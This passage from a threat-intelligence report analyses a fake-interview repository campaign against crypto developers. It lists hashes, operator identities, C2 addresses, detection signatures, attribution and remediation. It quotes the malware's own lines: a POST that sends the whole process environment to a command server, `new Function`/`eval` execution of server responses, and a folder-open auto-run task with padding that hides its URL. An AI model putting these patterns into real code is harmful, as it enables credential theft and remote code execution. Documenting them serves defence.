| `28e73ce85db813ba0839ee077428eaa121037e3a1ec8a13b1171e68cc2a0accd` | `server/routes/api/auth.js` | Primary malware file - `validateApiKey()` fires at module load |
| `cc9e443872d99b07e4bf5f6baa6144fbe0fd24bc610e58340d9b8c755df17fce` | `server/controllers/auth.js` | Exports `setApiKey` (atob wrapper) and `verify` (exfil POST) |
| `a9d8ea7c9a396d5c1f04d998f4f3e944c67ec4c88524a05c613bcb1ca0a7eacf` | `server/routes/index.js` | Clean route registration; `require('./api/auth')` triggers module-load execution |
| `a9db9559a1e97762d0e72715301329bc325d08e239a29e1382e99033ede986de` | `server/server.js` | Clean launcher; calls `loadEnv()` and `configureRoutes()` |
| `c08356a5a4ebbd8804c9acbe2e0c1b986d867b057d2e827ae663e4aec2204ed2` | `server/config/loadEnv.js` | Clean dotenv wrapper; merges `.env` and `.env.local` into `process.env` |
| `0700489f04fa6aebde239bf8cf8563706544802d016386edc6c3ad229d0781fd` | `env-setup.js` (Path 1 delivery, GET `/api/settings/env`) | Beacon payload dropped to `$HOME/.vscode/` by Path 1 bootstrap; functionally identical to Path 2 delivery; whitespace variance only |
| `da587eb8da90bc8f5203867d193933342048009f5452bf1d402346f503c573c7` | `env.npl` (Path 2 delivery, POST response from Vercel C2) | Beacon payload delivered in-memory via `new Function()`; functionally identical to Path 1 delivery; whitespace variance only |

### Repository and Identity Indicators

| Indicator | Type | Notes |
|---|---|---|
| `github.com/Intraverse-Dev-Tech-Hub/Dravion-Core` | Repository | Primary lure repository |
| `Intraverse-Dev-Tech-Hub` | GitHub Organisation | Operator persona for this campaign |
| `brajanjake@gmail.com` | Email | Operator contact - `brajan` prefix matches `brajan.intro@gmail.com` ([TP-2026-001](https://threatprophet.com/posts/2026-02-24-interview-trap/) confirmed Git author) |
| `JD-Luckykat` | Lure filename | `Luckykat` substring references `LuckyKat1001` operator account ([TP-2026-001](https://threatprophet.com/posts/2026-02-24-interview-trap/)) |
| `thomas.cryptolover@gmail.com` | Email | Commit-linked persona used by `Intraverse-Dev-Tech-Hub` during late-stage edits to `.env`, `.vscode/tasks.json`, and related files |
| `okada0209` | Username | Earlier development persona associated with the repository's pre-weaponisation phase |
| `lovelysong0209+2@gmail.com` | Email | Commit-linked persona tied to the earlier development phase under `okada0209` |
| `167746537+DeAngDai354@users.noreply.github.com` | GitHub noreply email | Initial commit identity (`Ivan`) recorded in repository history |
| `DeAngDai354` | Username | GitHub handle embedded in the initial commit noreply address |
| `calendly.com/brajanjake/45min` | URL | Scheduling link used to arrange the follow-on call |
| `JD-Luckykat.pdf` | PDF lure document | Project overview / job description document used in the pretext |

### Code Pattern Indicators

| Pattern | Notes |
|---|---|
| Two `runOn: folderOpen` tasks in `.vscode/tasks.json` | Dual auto-execution on folder open; both fire in parallel |
| `env` task with `close: true` | Terminal closes immediately - no visible trace of Path 1 execution |
| `"prepare": "node server/server.js"` | npm lifecycle hook infection trigger |
| ~200-char whitespace before command string in `tasks.json` | URL pushed off-screen; evasion of casual file inspection |
| `validateApiKey()` called at module load in `routes/api/auth.js` | Fires before any HTTP request or visible output |
| `const setApiKey = (s) => atob(s)` | Base64 C2 URL decode - present in [TP-2026-004](https://threatprophet.com/posts/2026-03-02-betpoker/) |
| `axios.post(api, { ...process.env }, { headers: { "x-app-request": "ip-check" } })` | Full env exfiltration with campaign fingerprint header |
| `new Function("require", response.data)(require)` | C2 response executed with full Node.js module access - consistent across [TP-2026-001](https://threatprophet.com/posts/2026-02-24-interview-trap/), [TP-2026-002](https://threatprophet.com/posts/2026-02-25-japanese-royal/), [TP-2026-004](https://threatprophet.com/posts/2026-03-02-betpoker/) |
| `AUTH_API` key containing base64-encoded URL in `.env` | C2 URL staging - consistent across [TP-2026-004](https://threatprophet.com/posts/2026-03-02-betpoker/) and TP-2026-009 |
| `Buffer` decode of secondary C2 URL within `env.npl` | Fourth obfuscation layer applied specifically to Hetzner C2 address |
| `eval(n)` on C2 response `message` field | RCE primitive in beacon loop |
| `sysId` session handle assigned by C2 and re-submitted on every beacon | Durable per-victim tracking across reconnects |
| `*.npl` executed by `node.exe` | InvisibleFerret-style payload naming |
| Beacon interval `5000ms` (`0x1388`) | Every 5 seconds - consistent across [TP-2026-001](https://threatprophet.com/posts/2026-02-24-interview-trap/), [TP-2026-004](https://threatprophet.com/posts/2026-03-02-betpoker/), TP-2026-009 |

### Detection Signatures

```
Network:  dst_ip=88.99.241[.]111 dst_port=1224
Network:  http_header "x-app-request: ip-check"
Network:  http_post to *.vercel.app/api with large JSON body containing env var keys
Network:  dns_query ip-address-vscode-checking.vercel.app
Network:  dns_query 2-27-bk-9-boss-api-copy-three.vercel.app
File:     *.npl executed by node.exe
File:     routes/api/auth.js containing validateApiKey() with new Function() delivery
File:     controllers/auth.js containing setApiKey + verify exports
Process:  node.exe spawned by npm.exe (prepare hook via VS Code task)
Env:      AUTH_API key containing base64-encoded URL in .env
```

**Detection note:** The indicators in this report are best operationalised as separate detections rather than a single generic Sigma rule. In practice, defenders should build distinct detections for: (1) outbound connections to `88.99.241[.]111:1224`; (2) outbound HTTP requests carrying the `x-app-request: ip-check` header; and (3) process chains involving VS Code task execution, npm lifecycle hooks, and `node` execution of unexpected payload files such as `.npl`. Any Sigma implementation should be backend-specific and mapped to the available network, proxy, and process telemetry.


---

## Attribution Assessment

**Assessed confidence: Low-to-Medium**

| Indicator | Evidence |
|---|---|
| Attack vector | Calendly interview invitation / fake technical assessment - Contagious Interview modus operandi documented since 2020 |
| Payload delivery | npm `prepare` lifecycle hook triggered via VS Code task - documented TraderTraitor TTP |
| Target profile | Web3/crypto developer stack: Alchemy, Infura, Etherscan, Coinbase, AWS |
| Dual delivery with separate C2 per path | Both tasks in `tasks.json`; `ip-address-vscode-checking` (Path 1) + `2-27-bk-9-boss-api-copy-three` (Path 2) - separate primary delivery endpoints reduce single-domain dependency and improve operational resilience |
| Credential targeting | AWS, Stripe, Coinbase, Infura - consistent with DPRK financial theft focus |
| Anti-debug | Runtime debugger detection triggering `while(true){}` |
| C2 evasion | Vercel (legitimate CDN) as primary C2 staging to bypass firewall blocklists |
| Infrastructure | Hetzner VPS (ASN24940) - documented in prior DPRK campaign reporting |
| WinRM-like service exposure | Port 5985 open; WinRM identity probe returned `OS: 0.0.0`, an anomalous response of uncertain cause |
| Campaign tag | `"now it time to get everything"` embedded in payload; analytically notable, but low-weight as attribution evidence |
| Cross-campaign links | File-level hash matches to [TP-2026-001](https://threatprophet.com/posts/2026-02-24-interview-trap/), [TP-2026-002](https://threatprophet.com/posts/2026-02-25-japanese-royal/), [TP-2026-004](https://threatprophet.com/posts/2026-03-02-betpoker/); operator email handle match to [TP-2026-001](https://threatprophet.com/posts/2026-02-24-interview-trap/) confirmed Git author |

Cross-campaign artifact continuity provides the strongest attribution signal in this report. The `.env.local` hash match across three campaigns indicates a shared tooling base. The `package.json` match to Softstack-Platform-MVP2 and the `brajan` handle overlap support campaign relatedness and closely aligned tradecraft, though they do not independently establish a single operator.

TTP similarity and file-level artifact matches do not constitute confirmed attribution. Attribution should not be asserted beyond low-to-medium confidence without additional corroborating intelligence.

**Relevant prior reporting:**
- [ThreatProphet TP-2026-001 - Interview Trap](https://threatprophet.com/posts/2026-02-24-interview-trap/)
- [ThreatProphet TP-2026-002 - Japanese-Royal](https://threatprophet.com/posts/2026-02-25-japanese-royal/)
- [ThreatProphet TP-2026-004 - BetPoker](https://threatprophet.com/posts/2026-03-02-betpoker/)
- [Palo Alto Unit42 - Contagious Interview](https://unit42.paloaltonetworks.com/two-campaigns-by-north-korea-bad-actors-target-job-hunters/)
- [CISA AA22-108A - TraderTraitor](https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-108a)
- [GitLab Threat Intelligence - North Korean Tradecraft (2026-02-19)](https://about.gitlab.com/blog/gitlab-threat-intelligence-reveals-north-korean-tradecraft/)
- [Microsoft Security Blog - Developer-targeting campaign using malicious Next.js repositories (2026-02-24)](https://www.microsoft.com/en-us/security/blog/2026/02/24/c2-developer-targeting-campaign/)

---

## Remediation

### If You Ran the Repository

Treat this as a confirmed credential compromise regardless of how the repository was used. Opening the folder in VS Code fires both `tasks.json` tasks simultaneously: the `env` pipe-to-shell task (Path 1) installs a persistent beacon in `$HOME/.vscode/`, and the `install-root-modules` task silently runs `npm install`, initiating the Path 2 chain that exfiltrates `process.env` before any output is visible. Running any npm command outside VS Code fires Path 2 identically. Either path alone is sufficient for full compromise.

- Isolate the affected machine from the network immediately.
- Preserve forensic evidence before remediation: memory dump, process list, shell history, `$HOME/.vscode/` contents.
- **Rotate all credentials** that were present in `.env` or `.env.local` at time of execution: AWS access keys, Infura/Alchemy/Pinata keys, Stripe and Coinbase keys, Etherscan and Polygonscan keys, OpenAI API key, and Session secret. Do not reuse rotated credentials on the same machine until persistence is confirmed removed.
- Check for the persistence beacon in `$HOME/.vscode/`: look for `env-setup.js`, `vscode-bootstrap.sh`, `vscode-bootstrap.cmd`, `package.json` not placed by you, and any `.txt` files named after project directories.
- Audit persistent execution mechanisms: cron jobs, `launchd` agents (`~/Library/LaunchAgents/` on macOS), systemd user units, and registry Run keys (Windows).
- Audit cloud provider access logs (AWS CloudTrail, etc.) for anomalous API calls in the window following the folder open event - credential abuse may begin within seconds of the initial exfiltration POST.
- Do not rely exclusively on AV/EDR. The payload executes as JavaScript within a legitimate Node.js process and is unlikely to be flagged by signature-based tooling.
- Reimage from a known-good backup or clean OS install once forensic preservation is complete.

### Network-Level Detection

- Block and alert on all outbound connections to `88.99.241[.]111`, all ports, especially TCP/1224.
- Create IDS/IPS rules for plain HTTP outbound from Node.js processes to non-standard high ports.
- Monitor for outbound POST requests to `*.vercel.app/api` carrying `x-app-request: ip-check` from Node.js processes.
- Flag DNS queries to `ip-address-vscode-checking.vercel.app` and `2-27-bk-9-boss-api-copy-three.vercel.app` from developer workstations.
- Alert on Node.js processes executing `.npl` files.

### Host-Level Hardening

- Set `task.allowAutomaticTasks` to `off` or `prompt` in VS Code user settings. This prevents both `runOn: folderOpen` tasks from firing silently, breaking Path 1 entirely and stopping the automatic trigger of Path 2. Note that Path 2 still fires if the victim subsequently runs any npm command.
- Audit `.vscode/tasks.json` before opening any repository from an unknown source. Look specifically for `runOn: folderOpen` and pipe-to-shell commands. Scroll horizontally in the raw file - malicious URLs may be pushed far off-screen by whitespace padding. Note that the `env` task closes its terminal immediately (`close: true`); absence of a visible terminal is not evidence that the task did not fire.
- Audit `prepare`, `postinstall`, and `preinstall` scripts in `package.json` before running any npm commands in unfamiliar projects.
- When evaluating repositories from unknown parties - including technical interview assessments - run them in an isolated VM or container with no access to host credentials, no mounted `.env` files containing real secrets, and filtered outbound network egress.
- Ensure `.env.local` files on developer workstations do not contain credentials that would cause material harm if exfiltrated. Prefer runtime secrets injection over file-based credential storage where possible.

---

*TLP:CLEAR - This report may be freely shared. Attribution assessments are tentative and based on TTP similarity only. All IOCs are provided for defensive purposes.*

*Report ID: TP-2026-009 | Published: 2026-04-13 | Author: [ThreatProphet](https://threatprophet.com)*